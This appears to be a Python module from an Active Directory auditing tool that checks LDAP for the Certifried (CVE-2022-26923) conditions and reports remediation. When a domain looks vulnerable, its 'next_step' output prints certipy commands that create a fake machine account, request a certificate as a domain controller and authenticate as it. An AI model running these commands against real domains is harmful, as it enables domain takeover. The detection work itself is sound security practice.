"""
CVE-2022-26923 — Certifried (AD CS + Machine Account Abuse)
Any domain user can create a machine account (if MAQ > 0), request a certificate
with the machine's dNSHostName set to a DC, and authenticate as the DC.
Detection: Check AD CS enrollment services exist + MachineAccountQuota > 0.
"""

from kerb_map.modules.cves.cve_base import CVEBase, CVEResult, Severity
from kerb_map.output.logger import Logger

log = Logger()


class Certifried(CVEBase):
    CVE_ID = "CVE-2022-26923"
    NAME = "Certifried (AD CS Machine Account Abuse)"

    def check(self) -> CVEResult:
        log.info(f"Checking {self.CVE_ID} ({self.NAME})...")
        adcs_present = self._check_adcs()
        maq = self._get_maq()
        patched = self._infer_patch_status()

        vulnerable = adcs_present and maq > 0 and not patched

        return CVEResult(
            cve_id=self.CVE_ID,
            name=self.NAME,
            severity=Severity.CRITICAL,
            vulnerable=vulnerable,
            reason=(
                f"AD CS is deployed, MachineAccountQuota={maq}, and domain appears "
                f"unpatched — any domain user can impersonate a DC via certificate abuse"
            ) if vulnerable else (
                f"AD CS {'present' if adcs_present else 'not found'}, "
                f"MAQ={maq}, patch {'detected' if patched else 'not detected'}"
            ),
            evidence={
                "adcs_present": adcs_present,
                "machine_account_quota": maq,
                "patch_inferred": patched,
            },
            remediation=(
                "1. Apply May 2022 security updates (KB5014754) on all DCs.\n"
                "2. Set ms-DS-MachineAccountQuota = 0.\n"
                "3. Enable strong certificate mapping enforcement."
            ),
            next_step=(
                f"# Create machine account, set dNSHostName to DC, request cert\n"
                f"certipy account create -u user@{self.domain} -p pass "
                f"-dc-ip {self.dc_ip} -user FAKE$ -dns <DC_FQDN>\n"
                f"certipy req -u FAKE$@{self.domain} -p pass "
                f"-ca <CA_NAME> -template Machine -dc-ip {self.dc_ip}\n"
                f"certipy auth -pfx dc.pfx -dc-ip {self.dc_ip}"
            ) if vulnerable else "",
            references=["https://research.ifcr.dk/certifried-active-directory-domain-privilege-escalation-cve-2022-26923-9e098fe298f4"],
        )

    def _check_adcs(self) -> bool:
        entries = self.ldap.query_config(
            search_filter="(objectClass=pKIEnrollmentService)",
            attributes=["cn"],
        )
        return len(entries) > 0

    def _get_maq(self) -> int:
        entries = self.ldap.query(
            search_filter="(objectClass=domainDNS)",
            attributes=["ms-DS-MachineAccountQuota"],
        )
        if entries:
            val = entries[0]["ms-DS-MachineAccountQuota"].value
            return int(val) if val is not None else 10
        return 10

    def _infer_patch_status(self) -> bool:
        entries = self.ldap.query(
            search_filter="(objectClass=domainDNS)",
            attributes=["msDS-Behavior-Version"],
        )
        if entries:
            level = int(entries[0]["msDS-Behavior-Version"].value or 0)
            return level >= 7
        return False
